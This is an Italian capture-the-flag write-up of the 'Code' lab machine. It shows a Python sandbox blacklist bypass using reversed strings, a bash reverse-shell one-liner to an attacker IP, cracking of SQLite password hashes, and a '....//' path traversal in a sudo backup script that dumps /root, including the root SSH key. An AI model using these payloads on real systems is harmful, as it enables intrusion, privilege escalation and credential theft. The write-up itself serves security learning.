+++
date = '2026-09-14T17:27:03+02:00'
draft = false
title = 'Code Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`11/09/2026`**

![pwn.png](/images/imgs_code/pwn.png)

---
# Introduzione

**_Code_** è una macchina **Linux** di livello **Easy** che si concentra sul testing di un'applicazione web, in particolare sull'evasione di una sandbox **Python** restrittiva.

L'exploitation path inizia interagendo con un **Python Code Editor** sulla porta **5000**. L'applicazione filtra le parole chiave pericolose, richiedendo un bypass creativo tramite l'uso di funzioni **Python built-in** e dello **string slicing** per ottenere una **Remote Code Execution** (**RCE**). Dopo aver ottenuto l'accesso iniziale come **app-production**, il lateral movement viene effettuato enumerando un database **SQLite** locale e craccando l'hash di un utente. Per la Privilege Escalation uno script bash personalizzato per i backup risulta vulnerabile a path traversal a causa di un filtro **regex jq** incompleto, permettendo l'estrazione dell'intera directory **root**.

---
# Tecniche Utilizzate

- **Python Sandbox Evasion**

- **String Slicing & Built-in Abuses**

- **SQLite Database Enumeration**

- **Hash Cracking**

- **Path Traversal / Regex Bypass**

---
# Enumerazione
## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- code 
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
2499/tcp  filtered unicontrol
5000/tcp  open     upnp
7081/tcp  filtered unknown
12523/tcp filtered unknown
56712/tcp filtered unknown                                                60359/tcp filtered unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV code
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **5000**/tcp - Web (Gunicorn / Python Code Editor)

---
# Accesso Iniziale | Python Sandbox Evasion

Navigando sulla porta **5000** è hostata un'applicazione web "**Python Code Editor**". Funziona come un interprete online.

![web1.png](/images/imgs_code/web1.png)

Ho testato una classica **command injection** in **Python**:

```Python
command = input("Enter a command to execute: ")
os.system(command)
```

Il server ha risposto con un messaggio di errore specifico:

```text
Use of restricted keywords is not allowed.
```

![restricted.png](/images/imgs_code/restricted.png)

Questo errore indica che l'applicazione non utilizza una sandbox sicura e isolata, ma piuttosto una semplice blacklist testuale (**sanitizzazione dell'input**) che filtra specifiche stringhe pericolose. Per aggirare il blocco, dovevo capire esattamente cosa fosse blacklistato. Ho iniziato a fare fuzzing manuale sull'input:

**`import os`** ➔ **Bloccato**

**`import`** ➔ **Bloccato**

**`os`** ➔ **Bloccato**

**`read`** ➔ **Bloccato**

**`print`** ➔ **Consentito**

Poiché **`print`** era consentito, l'ho usato per ispezionare l'ambiente. Il mio obiettivo era trovare un modo per accedere ai moduli limitati senza digitare i loro nomi espliciti. Per farlo, ho eseguito **`print(globals())`**.

**Nota**: _La funzione **`globals()`** in **Python** restituisce un dizionario che rappresenta l'attuale tabella dei simboli globali. Accedendo a questo dizionario, è potenzialmente possibile richiamare funzioni **built-in** o accedere ai moduli manipolando le stringhe come chiavi del dizionario, invece di usare le parole chiave esplicite che fanno scattare la blacklist._

L'output ha confermato che **`globals()`** funzionava. Ora dovevo caricare il modulo **`os`**. Siccome la stringa esplicita "**os**" veniva bloccata dal filtro, dovevo costruirla dinamicamente durante l'esecuzione affinché il filtro statico non la rilevasse nel mio payload.

Ho utilizzato lo **string slicing** di **Python**:

```python
print(globals()['so'[::-1]])
```

![bypass.png](/images/imgs_code/bypass.png)

Una volta caricato **`os`**, l'ho salvato in una variabile e ho applicato l'esatta tecnica di inversione per accedere all'attributo **`popen`** (invertito in '**nepop**'), aggirando nuovamente la blacklist:

```python
so = (globals()['so'[::-1]])
p0pen = (getattr(so, 'nepop'[::-1]))
```

Infine, dovevo leggere l'output del comando eseguito. Anche la parola **`read`** era in blacklist, quindi ho applicato il trucco dello **string slicing** un'ultima volta. Ho testato la catena con il comando **`id`**:

```python
so = (globals()['so'[::-1]])
p0pen = (getattr(so, 'nepop'[::-1]))
print(getattr(p0pen('id'), 'daer'[::-1])())
```

![execution.png](/images/imgs_code/execution.png)

Successivamente, ho sostituito il comando **`id`** con il codice per una reverse shell, ho impostato un listener **netcat** e ho eseguito il flusso:

```python
so = (globals()['so'[::-1]])
p0pen = (getattr(so, 'nepop'[::-1]))
print(getattr(p0pen('bash -c "bash -i >& /dev/tcp/10.10.15.152/22667 0>&1"'), 'daer'[::-1])())
```

![initial_access.png](/images/imgs_code/initial_access.png)

Ho ottenuto una shell come **`app-production`** e recuperato la **user flag**.

![userf.png](/images/imgs_code/userf.png)

---
# Lateral Movement | SQLite to SSH

All'interno della home directory di **`app-production`**, erano presenti i file dell'applicazione web. Esplorando la directory **`app/instance`**, ho trovato il file database **SQLite**.

![db.png](/images/imgs_code/db.png)

Utilizzando **sqlite3**, ho dumpato il database e recuperato due hash:

![db1.png](/images/imgs_code/db1.png)

Ho craccato gli hash (in questo caso utilizzando **Crackstation**)

- https://crackstation.net/

![station.png](/images/imgs_code/station.png)

Ho utilizzato le credenziali per connettermi tramite **SSH** come **`martin`**.

---
# Privilege Escalation | Path Traversal via Incomplete Filter

Una volta loggato come **`martin`**, ho verificato i privilegi **sudo**:

```bash
sudo -l
```

![sudol.png](/images/imgs_code/sudol.png)

L'utente poteva eseguire uno script di backup senza password. Eseguendolo senza argomenti mostrava l'utilizzo previsto:

```text
Usage: /usr/bin/backy.sh <task.json>
```

**`task.json`** è presente all'interno di **`/home/martin/backups/`**.

![priv2.png](/images/imgs_code/priv2.png)

L'esecuzione di **`sudo /usr/bin/backy.sh task.json`** ha creato un archivio di backup della directory specificata all'interno dell'oggetto **JSON**.

![priv1.png](/images/imgs_code/priv1.png)

Ho analizzato lo script per capire come elaborasse il file **JSON**:

```bash
cat /usr/bin/backy.sh
```

Lo script imponeva due controlli di sicurezza:

- **Richiedeva che la directory di destinazione iniziasse con `/var` o `/home`**.

- **Tentava di sanitizzare possibili path traversal utilizzando `jq`**: 

```bash
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

**Nota**: _La funzione **`gsub("\\.\\./"; "")`** è incompleta. Cerca e rimuove solo l'esatta sequenza **`../`**. Craftando un percorso come **`....//`**, il filtro rimuove il **`../`** interno, lasciando un **`../`** che viene passato al sistema, portando ad una **directory traversal**._

Per sfruttare questa falla, ho modificato **`task.json`** per farlo iniziare con **`/home`** (**soddisfacendo il primo controllo**) e poi fare traversal a ritroso per archiviare la directory **`/root`**:

![priv3.png](/images/imgs_code/priv3.png)

Ho eseguito lo script tramite **sudo**, generando un archivio chiamato **`code_home_.._root_2026_September.tar.bz2`**.

Ho estratto l'archivio:

```bash
tar -xvf code_home_.._root_2026_September.tar.bz2
```

![priv4.png](/images/imgs_code/priv4.png)

Conteneva l'intera directory **root**. Compresa la **root flag**. 

![rootf.png](/images/imgs_code/rootf.png)

Per persistenza e compromissione totale del sistema, è possibile estrarre da questo backup anche la chiave **`/root/.ssh/id_rsa`**.

---
# Considerazioni Finali

**_Code_** è una macchina che evidenzia i pericoli legati all'uso di blacklist di stringhe statiche per la sicurezza. L'evasione della sandbox **Python** richiede la giusta dose di creatività con le funzioni **built-in** senza diventare frustrante. La privilege escalation è un ottimo esempio reale di come i filtri regex personalizzati siano notoriamente difficili da implementare in modo corretto, dimostrando che una sanitizzazione incompleta è spesso sfruttabile tanto quanto l'assenza totale di sanitizzazione.
